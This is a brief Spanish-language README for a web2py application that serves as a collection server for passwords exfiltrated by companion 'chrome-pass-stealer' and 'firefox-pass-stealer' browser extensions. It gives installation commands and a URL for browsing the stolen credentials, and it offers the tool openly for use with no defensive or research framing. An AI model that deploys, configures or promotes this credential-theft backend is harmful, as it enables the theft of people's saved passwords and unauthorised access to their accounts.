# web2py-passget
Aplicación web2py que tiene como objetivo almacenar las contraseñas enviadas por [chrome-pass-stealer](https://github.com/sh4r3m4n/chrome-pass-stealer) y [firefox-pass-stealer](https://github.com/sh4r3m4n/firefox-pass-stealer).
### Instalación
```
cd ~/web2py # Donde tenemos web2py
cd applications
git clone https://github.com/sh4r3m4n/web2py-passget.git
mv web2py-passget passget
```

### Mostrar contraseñas obtenidas
Una vez que se capturaron las contraseñas con la extensión, ir a [http://localhost:8000/passget/appadmin/select/db?query=db.passwords.id%3E0](http://localhost:8000/passget/appadmin/select/db?query=db.passwords.id%3E0) (reemplazar localhost:8000 por el host y el puerto correspondientes).
